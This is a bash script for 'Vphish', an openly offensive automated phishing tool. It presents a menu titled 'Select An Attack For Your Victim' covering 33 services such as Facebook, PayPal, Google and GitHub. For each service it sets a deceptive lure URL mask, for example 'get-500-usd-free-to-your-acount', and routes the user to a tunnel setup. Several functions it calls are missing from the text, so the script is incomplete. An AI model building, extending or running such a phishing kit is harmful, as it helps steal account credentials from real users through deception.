#!/bin/bash

spin () {

local pid=$!
local delay=0.25
local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[34m\r[*] Please wait.........\e[33m[\033[32m$i\033[33m]\033[0m   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "\e[1;33m [Done]\e[0m";
echo "";

}

##   Vphish 	: 	Automated Phishing Tool
##   Author 	: 	Viraj L R 
##   Version 	: 	1.0
##   Github 	: 	https://github.com/VirajLR

## If you Copy Then Give the credits :)


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1&> /dev/null & spin
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1&> /dev/null & spin
	fi
}


## Banner
banner() {
	cat <<- EOF
		${RED}
		${RED}   ..      ..${WHITE}       _     _     _               
		${RED}   \ \    / /${WHITE}      | |   (_)   | |              
		${RED}    \ \  / / ${WHITE} _ __ | |__  _ ___| |__  
		${RED}     \ \/ /  ${WHITE}| '_ \| '_ \| / __| '_  \ 
		${RED}      \  /   ${WHITE}| |_) | | | | \__ \ | | |   
		${RED}       \/    ${WHITE}| .__/|_| |_|_|___/_| |_|  
		${RED}             ${WHITE}| |                                
		${RED}             ${WHITE}|_|                ${RED}Version : 1.0

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Powered By Viraj LR${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}  ░█░░░█░█▀█░█░█░▀█▀░█▀▀░█░█░
		${BLUE}  ░░▄ ▄░░█▀▀░█▀█░░█░░▀▀█░█▀█░
		${BLUE}  ░░░▄░░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░${WHITE} 1.0
	EOF
}




## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${GREEN}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${GREEN}::${RED}]${ORANGE}

		${RED}[${GREEN}01${RED}]${ORANGE} Facebook      ${RED}[${GREEN}11${RED}]${ORANGE} Twitch       ${RED}[${GREEN}21${RED}]${ORANGE} DeviantArt
		${RED}[${GREEN}02${RED}]${ORANGE} Instagram     ${RED}[${GREEN}12${RED}]${ORANGE} Pinterest    ${RED}[${GREEN}22${RED}]${ORANGE} Badoo
		${RED}[${GREEN}03${RED}]${ORANGE} Google        ${RED}[${GREEN}13${RED}]${ORANGE} Snapchat     ${RED}[${GREEN}23${RED}]${ORANGE} Origin
		${RED}[${GREEN}04${RED}]${ORANGE} Microsoft     ${RED}[${GREEN}14${RED}]${ORANGE} Linkedin     ${RED}[${GREEN}24${RED}]${ORANGE} DropBox	
		${RED}[${GREEN}05${RED}]${ORANGE} Netflix       ${RED}[${GREEN}15${RED}]${ORANGE} Ebay         ${RED}[${GREEN}25${RED}]${ORANGE} Yahoo		
		${RED}[${GREEN}06${RED}]${ORANGE} Paypal        ${RED}[${GREEN}16${RED}]${ORANGE} Quora        ${RED}[${GREEN}26${RED}]${ORANGE} Wordpress
		${RED}[${GREEN}07${RED}]${ORANGE} Steam         ${RED}[${GREEN}17${RED}]${ORANGE} Protonmail   ${RED}[${GREEN}27${RED}]${ORANGE} Yandex			
		${RED}[${GREEN}08${RED}]${ORANGE} Twitter       ${RED}[${GREEN}18${RED}]${ORANGE} Spotify      ${RED}[${GREEN}28${RED}]${ORANGE} StackoverFlow
		${RED}[${GREEN}09${RED}]${ORANGE} Playstation   ${RED}[${GREEN}19${RED}]${ORANGE} Reddit       ${RED}[${GREEN}29${RED}]${ORANGE} Vk
		${RED}[${GREEN}10${RED}]${ORANGE} Tiktok        ${RED}[${GREEN}20${RED}]${ORANGE} Adobe        ${RED}[${GREEN}30${RED}]${ORANGE} XBOX
		${RED}[${GREEN}31${RED}]${ORANGE} Mediafire     ${RED}[${GREEN}32${RED}]${ORANGE} Gitlab       ${RED}[${GREEN}33${RED}]${ORANGE} Github

		${RED}[${GREEN}99${RED}]${ORANGE} About         ${RED}[${GREEN}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='http://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='http://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='http://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='http://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='http://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='http://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='http://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='http://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='http://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='http://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='http://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='http://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='http://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='http://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='http://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='http://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_cloudflared
main_menu
